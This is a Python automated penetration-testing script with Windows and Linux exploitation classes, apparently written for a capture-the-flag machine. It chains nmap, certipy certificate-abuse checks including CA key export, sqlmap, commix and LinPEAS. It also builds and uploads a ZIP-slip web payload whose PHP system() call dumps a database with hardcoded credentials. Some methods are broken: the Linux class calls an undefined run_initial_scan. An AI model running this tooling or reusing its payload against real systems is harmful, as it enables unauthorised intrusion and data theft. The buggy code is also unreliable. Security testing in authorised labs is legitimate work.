#!/usr/bin/env python3
import subprocess
import os
import json
import logging
from datetime import datetime
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass
import re
import asyncio
import aiohttp
import concurrent.futures
from pathlib import Path

@dataclass
class AttackVector:
    name: str
    description: str
    cvss_score: float
    complexity: str  # "Easy", "Medium", "Hard"
    probability_of_success: int  # 1-10
    probability_of_damage: int  # 1-10
    requires_local_testing: bool
    poc_available: bool
    poc_location: Optional[str]
    target_service: str
    target_version: str

class BaseExploitation:
    def __init__(self, target: str, logger: logging.Logger, config: Dict[str, Any]):
        self.target = target
        self.logger = logger
        self.config = config
        self.tools_dir = Path(os.path.dirname(os.path.dirname(__file__))) / 'tools'
        
        # Use output directory from config if provided, otherwise use default
        if 'output_dir' in config:
            self.output_dir = Path(config['output_dir'])
        else:
            self.output_dir = Path(os.path.dirname(os.path.dirname(__file__))) / 'reports' / 'scans'
        
        self.attack_vectors: List[AttackVector] = []
        self.findings: List[Dict[str, Any]] = []
        
        # Create output directory if it doesn't exist
        self.output_dir.mkdir(parents=True, exist_ok=True)
        
        # Create a logs subdirectory for all log files
        self.logs_dir = self.output_dir / 'logs'
        self.logs_dir.mkdir(parents=True, exist_ok=True)
        
        # Set up file handler for logging
        log_file = self.logs_dir / f'exploitation_{datetime.now().strftime("%Y%m%d_%H%M%S")}.log'
        file_handler = logging.FileHandler(log_file)
        file_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
        self.logger.addHandler(file_handler)
        
    async def _run_command_async(self, command: str) -> str:
        """Execute a command asynchronously and return its output."""
        try:
            proc = await asyncio.create_subprocess_shell(
                command,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, stderr = await proc.communicate()
            
            if proc.returncode != 0:
                if self.logger:
                    self.logger.error(f"Command failed: {command}")
                    self.logger.error(f"Error: {stderr.decode()}")
                return ""
            return stdout.decode()
        except Exception as e:
            if self.logger:
                self.logger.error(f"Error executing command {command}: {str(e)}")
            return ""

    def _run_command(self, command: str) -> str:
        """Execute a command and return its output."""
        try:
            result = subprocess.run(
                command.split(),
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                timeout=300  # 5-minute timeout
            )
            if result.returncode != 0:
                if self.logger:
                    self.logger.error(f"Command failed: {command}")
                    self.logger.error(f"Error: {result.stderr}")
                return ""
            return result.stdout
        except subprocess.TimeoutExpired:
            self.logger.error(f"Command timed out: {command}")
            return ""
        except Exception as e:
            if self.logger:
                self.logger.error(f"Error executing command {command}: {str(e)}")
            return ""

    def _save_findings(self, findings: List[Dict], filename: str):
        """Save findings to a JSON file."""
        output_file = self.output_dir / f'{filename}_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json'
        with open(output_file, 'w') as f:
            json.dump(findings, f, indent=4)
        
        if self.logger:
            self.logger.info(f"Findings saved to {output_file}")

    def _save_output(self, content: str, filename: str) -> Optional[Path]:
        """Save output to file"""
        try:
            output_path = self.output_dir / filename
            output_path.write_text(content)
            self.logger.info(f"Output saved to {output_path}")
            return output_path
        except Exception as e:
            self.logger.error(f"Error saving output: {str(e)}")
            return None

    def _update_hosts_file(self, ip: str, domains: List[str]) -> bool:
        """Update /etc/hosts file with discovered domains"""
        try:
            # Clean domain names by removing any trailing numbers or special characters
            cleaned_domains = []
            for domain in domains:
                # Remove any trailing numbers and special characters
                cleaned_domain = re.sub(r'[^a-zA-Z0-9.-]+$', '', domain)
                # Remove any trailing dots
                cleaned_domain = cleaned_domain.rstrip('.')
                cleaned_domains.append(cleaned_domain)
            
            # Create hosts entry with cleaned domains
            hosts_entry = f"{ip} {' '.join(cleaned_domains)}"
            hosts_cmd = f"echo '{hosts_entry}' | sudo tee -a /etc/hosts"
            self.logger.info(f"Updating /etc/hosts: {hosts_cmd}")
            subprocess.run(hosts_cmd, shell=True, check=True)
            return True
        except Exception as e:
            self.logger.error(f"Error updating /etc/hosts: {str(e)}")
            return False

    def _extract_domain_info(self, nmap_output: str) -> Dict[str, Any]:
        """Extract domain information from nmap output"""
        domain_info = {
            'domain': None,
            'dc_hostname': None,
            'time_skew': None,
            'cert_info': None
        }
        
        # Extract domain name
        domain_match = re.search(r'Domain: ([^\s,]+)', nmap_output)
        if domain_match:
            domain_info['domain'] = domain_match.group(1)
            
        # Extract DC hostname
        dc_match = re.search(r'commonName=([^,]+)', nmap_output)
        if dc_match:
            domain_info['dc_hostname'] = dc_match.group(1)
            
        # Extract time skew
        time_skew_match = re.search(r'mean: ([^,]+)', nmap_output)
        if time_skew_match:
            domain_info['time_skew'] = time_skew_match.group(1)
            
        # Extract certificate information
        cert_matches = re.finditer(r'Not valid before: ([^\n]+)\nNot valid after: ([^\n]+)', nmap_output)
        if cert_matches:
            cert_info = []
            for match in cert_matches:
                cert_info.append({
                    'valid_from': match.group(1),
                    'valid_to': match.group(2)
                })
            domain_info['cert_info'] = cert_info
            
        return domain_info

    async def run_initial_scan_async(self) -> Dict[str, Any]:
        """Run initial port scan asynchronously"""
        self.logger.info(f"Running initial scan on {self.target}")
        
        try:
            # First scan to find open ports with high rate
            ports_output_file = self.output_dir / 'nmap_ports.txt'
            ports_cmd = f"nmap -p- --min-rate 10000 {self.target} >> {ports_output_file}"
            self.logger.info(f"Running initial port discovery: {ports_cmd}")
            await self._run_command_async(ports_cmd)
            
            # Read the ports from the output file
            if ports_output_file.exists():
                ports_output = ports_output_file.read_text()
                ports = '\n'.join([line.split('/')[0] for line in ports_output.split('\n') if line.strip() and line[0].isdigit()])
            else:
                self.logger.error("No open ports found")
                return {}
            
            # Detailed scan of found ports
            nmap_output_file = self.output_dir / 'nmap_detailed.txt'
            nmap_xml_file = self.output_dir / 'nmap_detailed.xml'
            nmap_cmd = f"nmap -p{ports} -sCV -A {self.target} -oN {nmap_output_file} -oX {nmap_xml_file}"
            self.logger.info(f"Running detailed nmap scan: {nmap_cmd}")
            await self._run_command_async(nmap_cmd)
            
            # Run default nmap scripts
            nmap_scripts_file = self.output_dir / 'nmap_scripts.txt'
            nmap_scripts_cmd = f"nmap -sC -sV -p{ports} {self.target} -oN {nmap_scripts_file}"
            self.logger.info(f"Running nmap scripts: {nmap_scripts_cmd}")
            await self._run_command_async(nmap_scripts_cmd)
            
            # Extract and store domain information
            if nmap_output_file.exists():
                nmap_output = nmap_output_file.read_text()
                domain_info = self._extract_domain_info(nmap_output)
                if domain_info['domain'] and domain_info['dc_hostname']:
                    domains = [domain_info['domain'], domain_info['dc_hostname']]
                    self._update_hosts_file(self.target, domains)
                    
                    # Store domain information
                    domain_info_file = self.output_dir / 'domain_info.json'
                    with open(domain_info_file, 'w') as f:
                        json.dump(domain_info, f, indent=4)
            
            return {
                'nmap_ports': str(ports_output_file),
                'nmap_detailed': str(nmap_output_file),
                'nmap_xml': str(nmap_xml_file),
                'nmap_scripts': str(nmap_scripts_file),
                'domain_info': domain_info if 'domain_info' in locals() else {}
            }
        except Exception as e:
            self.logger.error(f"Error during initial scan: {str(e)}")
            return {}

class WindowsExploitation(BaseExploitation):
    def __init__(self, target: str, logger: logging.Logger, config: Dict[str, Any]):
        super().__init__(target, logger, config)
        self.os_type = "windows"
        self.web_findings: List[Dict[str, Any]] = []
        self.certificate_findings: List[Dict[str, Any]] = []
        self.privilege_findings: List[Dict[str, Any]] = []
        self.domain_info: Dict[str, Any] = {}

    async def check_domain_controller_async(self) -> Dict[str, Any]:
        """Check if target is a domain controller asynchronously"""
        self.logger.info("Checking for domain controller...")
        
        try:
            # Check common DC ports
            ports = [88, 389, 636, 445, 3268, 3269, 9389]  # Added 9389 for ADCS
            results = {}
            
            # Run port checks concurrently
            async with aiohttp.ClientSession() as session:
                tasks = []
                for port in ports:
                    port_output_file = self.output_dir / f'dc_port_{port}.txt'
                    nmap_cmd = f"nmap -p{port} -sV {self.target} -oN {port_output_file}"
                    tasks.append(self._run_command_async(nmap_cmd))
                
                port_results = await asyncio.gather(*tasks)
                for port, result in zip(ports, port_results):
                    results[f'port_{port}'] = str(self.output_dir / f'dc_port_{port}.txt')
            
            # Run enum4linux
            enum_output_file = self.output_dir / 'enum4linux.txt'
            enum_cmd = f"enum4linux -a {self.target} >> {enum_output_file}"
            self.logger.info(f"Running enum4linux: {enum_cmd}")
            await self._run_command_async(enum_cmd)
            results['enum4linux'] = str(enum_output_file)
            
            # Check for ADCS web enrollment
            async with aiohttp.ClientSession() as session:
                try:
                    async with session.get(f"http://{self.target}/certsrv/") as response:
                        if response.status == 200:
                            results['adcs_web_enrollment'] = True
                except:
                    pass
            
            return results
        except Exception as e:
            self.logger.error(f"Error checking domain controller: {str(e)}")
            return {}

    async def check_certificate_services_async(self) -> List[Dict[str, Any]]:
        """Enhanced check for Active Directory Certificate Services"""
        self.logger.info("Checking for certificate services...")
        findings = []

        try:
            # Check ADCS web enrollment
            async with aiohttp.ClientSession() as session:
                try:
                    async with session.get(f"http://{self.target}/certsrv/") as response:
                        if response.status == 200:
                            findings.append({
                                'type': 'adcs_web_enrollment',
                                'severity': 'high',
                                'description': 'ADCS web enrollment interface is accessible',
                                'details': {'url': f'http://{self.target}/certsrv/'}
                            })
                except:
                    pass

            # Check for certificate templates
            templates_output_file = self.output_dir / 'certipy_templates.txt'
            cert_templates_cmd = f"certipy-ad template -u 'anonymous' -p '' -dc-ip {self.target} >> {templates_output_file}"
            self.logger.info(f"Running certipy templates check: {cert_templates_cmd}")
            templates_output = await self._run_command_async(cert_templates_cmd)
            
            if templates_output_file.exists():
                templates_output = templates_output_file.read_text()
                findings.append({
                    'type': 'certificate_templates',
                    'severity': 'high',
                    'description': 'Certificate templates found',
                    'details': {'output': templates_output, 'file': str(templates_output_file)}
                })

            # Check for vulnerable certificate templates
            vulnerable_templates = []
            for line in templates_output.split('\n'):
                if any(vuln in line.lower() for vuln in ['enrolleesuppliessubject', 'clientauthentication', 'smartcardlogon']):
                    vulnerable_templates.append(line.strip())

            if vulnerable_templates:
                findings.append({
                    'type': 'vulnerable_certificate_templates',
                    'severity': 'critical',
                    'description': 'Vulnerable certificate templates found',
                    'details': {'templates': vulnerable_templates}
                })

            # Check for CA private key access
            ca_output_file = self.output_dir / 'certipy_ca.txt'
            ca_check_cmd = f"certipy-ad ca -u 'anonymous' -p '' -dc-ip {self.target} >> {ca_output_file}"
            self.logger.info(f"Running certipy CA check: {ca_check_cmd}")
            ca_output = await self._run_command_async(ca_check_cmd)
            
            if ca_output_file.exists():
                ca_output = ca_output_file.read_text()
                findings.append({
                    'type': 'ca_information',
                    'severity': 'high',
                    'description': 'Certificate Authority information found',
                    'details': {'output': ca_output, 'file': str(ca_output_file)}
                })

            return findings
        except Exception as e:
            self.logger.error(f"Error checking certificate services: {str(e)}")
            return findings

    async def check_file_upload_vulnerabilities_async(self) -> List[Dict[str, Any]]:
        """Check for file upload vulnerabilities asynchronously"""
        findings = []
        
        try:
            # Check for common upload endpoints
            upload_paths = ['/upload.php', '/upload', '/fileupload', '/uploadfile']
            async with aiohttp.ClientSession() as session:
                tasks = []
                for path in upload_paths:
                    tasks.append(session.head(f"http://{self.target}{path}"))
                
                responses = await asyncio.gather(*tasks, return_exceptions=True)
                for path, response in zip(upload_paths, responses):
                    if isinstance(response, aiohttp.ClientResponse) and response.status == 200:
                        findings.append({
                            'path': path,
                            'status': 'Found',
                            'type': 'Potential upload endpoint'
                        })
            
            # Test for ZIP slip vulnerability if endpoints found
            if findings:
                test_payload = await self._create_zip_slip_payload_async()
                for finding in findings:
                    upload_cmd = f"curl -X POST -F 'file=@{test_payload}' http://{self.target}{finding['path']}"
                    result = await self._run_command_async(upload_cmd)
                    if "success" in result.lower():
                        finding['vulnerability'] = 'Potential ZIP slip vulnerability'
                        finding['cvss_score'] = 8.1
                        finding['remediation'] = 'Implement proper archive extraction validation and path traversal checks'
            
            return findings
        except Exception as e:
            self.logger.error(f"Error checking file upload vulnerabilities: {str(e)}")
            return []

    async def _create_zip_slip_payload_async(self) -> str:
        """Create a ZIP slip test payload asynchronously"""
        try:
            # Create legitimate decoy file
            decoy_file = self.output_dir / 'legitimate.pdf'
            decoy_file.write_text("%PDF-1.4")
            
            # Create malicious payload
            payload_file = self.output_dir / 'database_extract.php'
            payload_content = """<?php 
system('"C:\\xampp\\mysql\\bin\\mysqldump.exe" -u certificate_webapp_user -pcert!f!c@teDBPWD Certificate_WEBAPP_DB > C:\\xampp\\htdocs\\certificate.htb\\static\\full_dump.sql');
?>"""
            payload_file.write_text(payload_content)
            
            # Create ZIP files
            subprocess.run(['zip', str(self.output_dir / 'legitimate.zip'), str(decoy_file)], check=True)
            subprocess.run(['zip', str(self.output_dir / 'malicious.zip'), str(payload_file)], check=True)
            
            # Combine archives
            with open(self.output_dir / 'legitimate.zip', 'rb') as f1, \
                 open(self.output_dir / 'malicious.zip', 'rb') as f2, \
                 open(self.output_dir / 'combined_payload.zip', 'wb') as f3:
                f3.write(f1.read())
                f3.write(f2.read())
            
            return str(self.output_dir / 'combined_payload.zip')
        except Exception as e:
            self.logger.error(f"Error creating ZIP slip payload: {str(e)}")
            return ""

    async def check_certificate_attacks_async(self) -> List[Dict[str, Any]]:
        """Check for certificate-based attack vectors"""
        self.logger.info("Checking for certificate-based attack vectors...")
        findings = []

        try:
            # Check time synchronization (critical for Kerberos)
            time_sync_output_file = self.output_dir / 'time_sync.txt'
            time_sync_cmd = f"ntpdate -q {self.target} >> {time_sync_output_file}"
            self.logger.info(f"Checking time synchronization: {time_sync_cmd}")
            time_sync_output = await self._run_command_async(time_sync_cmd)
            
            if time_sync_output_file.exists():
                time_sync_output = time_sync_output_file.read_text()
                findings.append({
                    'type': 'time_synchronization',
                    'severity': 'medium',
                    'description': 'Time synchronization check results',
                    'details': {'output': time_sync_output, 'file': str(time_sync_output_file)}
                })

            # Check for certificate templates vulnerable to ESC1
            esc1_output_file = self.output_dir / 'certipy_esc1.txt'
            esc1_cmd = f"certipy-ad find -u 'anonymous' -p '' -dc-ip {self.target} -vulnerable >> {esc1_output_file}"
            self.logger.info(f"Checking for ESC1 vulnerability: {esc1_cmd}")
            esc1_output = await self._run_command_async(esc1_cmd)
            
            if esc1_output_file.exists():
                esc1_output = esc1_output_file.read_text()
                if "ESC1" in esc1_output:
                    findings.append({
                        'type': 'esc1_vulnerability',
                        'severity': 'critical',
                        'description': 'Certificate template vulnerable to ESC1 (Subject Alternative Name abuse)',
                        'details': {'output': esc1_output, 'file': str(esc1_output_file)}
                    })

            # Check for certificate templates vulnerable to ESC8
            esc8_output_file = self.output_dir / 'certipy_esc8.txt'
            esc8_cmd = f"certipy-ad find -u 'anonymous' -p '' -dc-ip {self.target} -http >> {esc8_output_file}"
            self.logger.info(f"Checking for ESC8 vulnerability: {esc8_cmd}")
            esc8_output = await self._run_command_async(esc8_cmd)
            
            if esc8_output_file.exists():
                esc8_output = esc8_output_file.read_text()
                if "HTTP" in esc8_output:
                    findings.append({
                        'type': 'esc8_vulnerability',
                        'severity': 'critical',
                        'description': 'Certificate template vulnerable to ESC8 (HTTP certificate enrollment)',
                        'details': {'output': esc8_output, 'file': str(esc8_output_file)}
                    })

            # Check for CA private key export possibility
            ca_export_output_file = self.output_dir / 'certipy_ca_export.txt'
            ca_export_cmd = f"certipy-ad ca -u 'anonymous' -p '' -dc-ip {self.target} -export >> {ca_export_output_file}"
            self.logger.info(f"Checking CA private key export possibility: {ca_export_cmd}")
            ca_export_output = await self._run_command_async(ca_export_cmd)
            
            if ca_export_output_file.exists():
                ca_export_output = ca_export_output_file.read_text()
                if ca_export_output:
                    findings.append({
                        'type': 'ca_private_key_export',
                        'severity': 'critical',
                        'description': 'CA private key export possible',
                        'details': {'output': ca_export_output, 'file': str(ca_export_output_file)}
                    })

            return findings
        except Exception as e:
            self.logger.error(f"Error checking certificate attacks: {str(e)}")
            return findings

    async def check_privilege_escalation_async(self) -> List[Dict[str, Any]]:
        """Enhanced privilege escalation checks based on Certificate.md findings"""
        self.logger.info("Checking for privilege escalation vectors...")
        findings = []

        try:
            # Check for Account Operators group membership
            account_ops_output_file = self.output_dir / 'account_operators.txt'
            account_ops_cmd = f"net group \"Account Operators\" /domain >> {account_ops_output_file}"
            self.logger.info(f"Checking Account Operators group: {account_ops_cmd}")
            await self._run_command_async(account_ops_cmd)
            
            if account_ops_output_file.exists():
                account_ops_output = account_ops_output_file.read_text()
                findings.append({
                    'type': 'account_operators_group',
                    'severity': 'high',
                    'description': 'Account Operators group members found',
                    'details': {'output': account_ops_output, 'file': str(account_ops_output_file)}
                })

            # Check for Certificate Service DCOM Access
            cert_dcom_output_file = self.output_dir / 'cert_dcom_access.txt'
            cert_dcom_cmd = f"net group \"Certificate Service DCOM Access\" /domain >> {cert_dcom_output_file}"
            self.logger.info(f"Checking Certificate Service DCOM Access group: {cert_dcom_cmd}")
            await self._run_command_async(cert_dcom_cmd)
            
            if cert_dcom_output_file.exists():
                cert_dcom_output = cert_dcom_output_file.read_text()
                findings.append({
                    'type': 'certificate_dcom_access',
                    'severity': 'high',
                    'description': 'Certificate Service DCOM Access group members found',
                    'details': {'output': cert_dcom_output, 'file': str(cert_dcom_output_file)}
                })

            # Check for SeManageVolumePrivilege
            priv_output_file = self.output_dir / 'privileges.txt'
            priv_cmd = f"whoami /priv >> {priv_output_file}"
            self.logger.info(f"Checking privileges: {priv_cmd}")
            await self._run_command_async(priv_cmd)
            
            if priv_output_file.exists():
                priv_output = priv_output_file.read_text()
                if "SeManageVolumePrivilege" in priv_output:
                    findings.append({
                        'type': 'se_manage_volume_privilege',
                        'severity': 'critical',
                        'description': 'SeManageVolumePrivilege is enabled',
                        'details': {'output': priv_output, 'file': str(priv_output_file)}
                    })

            # Check for CA private key location
            ca_key_output_file = self.output_dir / 'ca_key_location.txt'
            ca_key_cmd = f"dir C:\\Windows\\System32\\CertSrv\\CertEnroll >> {ca_key_output_file}"
            self.logger.info(f"Checking CA private key location: {ca_key_cmd}")
            await self._run_command_async(ca_key_cmd)
            
            if ca_key_output_file.exists():
                ca_key_output = ca_key_output_file.read_text()
                findings.append({
                    'type': 'ca_private_key_location',
                    'severity': 'high',
                    'description': 'CA private key directory found',
                    'details': {'output': ca_key_output, 'file': str(ca_key_output_file)}
                })

            return findings
        except Exception as e:
            self.logger.error(f"Error checking privilege escalation: {str(e)}")
            return findings

    async def run_async(self) -> Dict[str, Any]:
        """Enhanced async run method with certificate-specific checks"""
        self.logger.info(f"Running Windows exploitation checks on {self.target}")
        
        try:
            # Run initial scan
            initial_scan = await self.run_initial_scan_async()
            
            # Check if target is domain controller
            dc_check = await self.check_domain_controller_async()
            
            # Run certificate services checks
            cert_checks = await self.check_certificate_services_async()
            self.certificate_findings.extend(cert_checks)
            
            # Run certificate-based attack checks
            cert_attack_checks = await self.check_certificate_attacks_async()
            self.certificate_findings.extend(cert_attack_checks)
            
            # Run privilege escalation checks
            priv_checks = await self.check_privilege_escalation_async()
            self.privilege_findings.extend(priv_checks)
            
            # Check for file upload vulnerabilities
            upload_checks = await self.check_file_upload_vulnerabilities_async()
            self.web_findings.extend(upload_checks)
            
            # Save all findings
            all_findings = {
                'initial_scan': initial_scan,
                'domain_controller': dc_check,
                'certificate_services': self.certificate_findings,
                'privilege_escalation': self.privilege_findings,
                'web_vulnerabilities': self.web_findings
            }
            
            self._save_findings(all_findings, 'windows_exploitation')
            
            return all_findings
        except Exception as e:
            self.logger.error(f"Error during Windows exploitation: {str(e)}")
            return {}

    def run(self) -> Dict[str, Any]:
        """Run Windows exploitation synchronously"""
        return asyncio.run(self.run_async())

class LinuxExploitation(BaseExploitation):
    def __init__(self, target, logger, config):
        super().__init__(target, logger, config)
        self.os_type = "linux"

    def check_web_server(self) -> bool:
        """Check if target is a web server."""
        nmap_cmd = f"nmap -p 80,443,8080,8443 -sV {self.target}"
        output = self._run_command(nmap_cmd)
        
        if "80/tcp" in output or "443/tcp" in output:
            self.findings.append({
                "type": "web_server",
                "details": "Web server detected",
                "ports": [80, 443, 8080, 8443]
            })
            return True
        return False

    def exploit_web_server(self):
        """Exploit web server scenario."""
        if not self.check_web_server():
            return

        # Web technology identification
        whatweb_cmd = f"whatweb -a 3 http://{self.target}"
        whatweb_output = self._run_command(whatweb_cmd)
        
        if whatweb_output:
            self.findings.append({
                "type": "web_technology",
                "details": "Web technology identification",
                "data": whatweb_output
            })

        # Nikto scan
        nikto_cmd = f"nikto -h http://{self.target}"
        nikto_output = self._run_command(nikto_cmd)
        
        if nikto_output:
            self.findings.append({
                "type": "nikto_scan",
                "details": "Nikto vulnerability scan results",
                "data": nikto_output
            })

        # Directory enumeration
        gobuster_cmd = f"gobuster dir -u http://{self.target} -w /usr/share/wordlists/dirb/common.txt"
        gobuster_output = self._run_command(gobuster_cmd)
        
        if gobuster_output:
            self.findings.append({
                "type": "directory_enumeration",
                "details": "Directory enumeration results",
                "data": gobuster_output
            })

        # SQL injection check
        sqlmap_cmd = f"sqlmap -u http://{self.target} --batch --random-agent"
        sqlmap_output = self._run_command(sqlmap_cmd)
        
        if sqlmap_output:
            self.findings.append({
                "type": "sql_injection",
                "details": "SQL injection test results",
                "data": sqlmap_output
            })

        # XSS check
        xss_cmd = f"xsser --url http://{self.target} --auto"
        xss_output = self._run_command(xss_cmd)
        
        if xss_output:
            self.findings.append({
                "type": "xss_vulnerability",
                "details": "XSS vulnerability test results",
                "data": xss_output
            })

        # Check for common web vulnerabilities
        wapiti_cmd = f"wapiti -u http://{self.target} -m all"
        wapiti_output = self._run_command(wapiti_cmd)
        
        if wapiti_output:
            self.findings.append({
                "type": "web_vulnerabilities",
                "details": "Wapiti vulnerability scan results",
                "data": wapiti_output
            })

        # Check for file inclusion vulnerabilities
        ffuf_cmd = f"ffuf -u http://{self.target}/FUZZ -w /usr/share/wordlists/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt"
        ffuf_output = self._run_command(ffuf_cmd)
        
        if ffuf_output:
            self.findings.append({
                "type": "file_inclusion",
                "details": "File inclusion vulnerability check",
                "data": ffuf_output
            })

        # Check for command injection
        commix_cmd = f"commix -u http://{self.target} --batch"
        commix_output = self._run_command(commix_cmd)
        
        if commix_output:
            self.findings.append({
                "type": "command_injection",
                "details": "Command injection vulnerability check",
                "data": commix_output
            })

    def exploit_standard_server(self):
        """Exploit standard Linux server scenario."""
        # Check for common Linux services
        nmap_cmd = f"nmap -p 21,22,23,25,3306,5432 -sV {self.target}"
        nmap_output = self._run_command(nmap_cmd)
        
        if nmap_output:
            self.findings.append({
                "type": "service_enumeration",
                "details": "Linux services discovered",
                "data": nmap_output
            })

        # SSH version check
        ssh_cmd = f"nc -v {self.target} 22"
        ssh_output = self._run_command(ssh_cmd)
        
        if ssh_output:
            self.findings.append({
                "type": "ssh_enumeration",
                "details": "SSH service information",
                "data": ssh_output
            })

        # Run LinPEAS for privilege escalation
        linpeas_output = self._run_linpeas()
        
        if linpeas_output:
            self.findings.append({
                "type": "privilege_escalation",
                "details": "LinPEAS privilege escalation check",
                "data": linpeas_output
            })

        # Run LinEnum for system enumeration
        linenum_cmd = f"linenum -h {self.target}"
        linenum_output = self._run_command(linenum_cmd)
        
        if linenum_output:
            self.findings.append({
                "type": "system_enumeration",
                "details": "LinEnum system enumeration",
                "data": linenum_output
            })

        # Check for common misconfigurations
        pspy_cmd = f"pspy -h {self.target}"
        pspy_output = self._run_command(pspy_cmd)
        
        if pspy_output:
            self.findings.append({
                "type": "process_monitoring",
                "details": "Process monitoring results",
                "data": pspy_output
            })

        # Check for SUID binaries
        find_cmd = f"find / -perm -4000 -type f -exec ls -la {{}} \\;"
        suid_output = self._run_command(find_cmd)
        
        if suid_output:
            self.findings.append({
                "type": "suid_binaries",
                "details": "SUID binaries found",
                "data": suid_output
            })

        # Check for world-writable files
        find_cmd = f"find / -perm -2 -type f -not -path '/proc/*' -exec ls -la {{}} \\;"
        writable_output = self._run_command(find_cmd)
        
        if writable_output:
            self.findings.append({
                "type": "world_writable_files",
                "details": "World-writable files found",
                "data": writable_output
            })

        # Check for kernel vulnerabilities
        kernel_cmd = f"uname -a"
        kernel_output = self._run_command(kernel_cmd)
        
        if kernel_output:
            self.findings.append({
                "type": "kernel_info",
                "details": "Kernel version information",
                "data": kernel_output
            })

        # Check for Docker containers
        docker_cmd = f"docker ps -a"
        docker_output = self._run_command(docker_cmd)
        
        if docker_output:
            self.findings.append({
                "type": "docker_containers",
                "details": "Docker container enumeration",
                "data": docker_output
            })

        # Check for common Linux vulnerabilities
        linux_vuln_cmd = f"nmap --script vuln -oA nmap_linux_vuln {self.target}"
        linux_vuln_output = self._run_command(linux_vuln_cmd)
        
        if linux_vuln_output:
            self.findings.append({
                "type": "linux_vulnerabilities",
                "details": "Linux vulnerability scan results",
                "data": linux_vuln_output
            })

    def _run_linpeas(self):
        """Run LinPEAS for privilege escalation checks"""
        self.logger.info("Running LinPEAS...")
        
        try:
            linpeas_path = self.tools_dir / 'linpeas.sh'
            if not linpeas_path.exists():
                self.logger.error("LinPEAS script not found")
                return None
                
            # Make script executable
            linpeas_path.chmod(0o755)
            
            # Run LinPEAS with various options
            output_file = self.output_dir / 'linpeas_output.txt'
            linpeas_cmd = f"{linpeas_path} -a -s -t -P -p -c -i -l -e -n -o {output_file}"
            self.logger.info(f"Running LinPEAS: {linpeas_cmd}")
            subprocess.run(linpeas_cmd.split(), check=True)
            
            return output_file
        except Exception as e:
            self.logger.error(f"Error running LinPEAS: {str(e)}")
            return None

    def run(self):
        """Run Linux exploitation"""
        self.logger.info("Starting Linux exploitation...")
        
        try:
            # Run initial scan
            scan_results = self.run_initial_scan()
            self.findings.append({
                "type": "initial_scan",
                "details": "Initial port scan results",
                "data": scan_results
            })
            
            # Check for web server
            if self.check_web_server():
                self.exploit_web_server()
            else:
                self.exploit_standard_server()
            
            return {
                "findings": self.findings,
                "attack_vectors": self.attack_vectors
            }
            
        except Exception as e:
            self.logger.error(f"Error during Linux exploitation: {str(e)}")
            return {
                "error": str(e),
                "findings": self.findings,
                "attack_vectors": self.attack_vectors
            }

def get_exploitation_class(os_type: str):
    """Factory function to get the appropriate exploitation class."""
    if os_type.lower() == "windows":
        return WindowsExploitation
    elif os_type.lower() == "linux":
        return LinuxExploitation
    else:
        raise ValueError(f"Unsupported OS type: {os_type}") 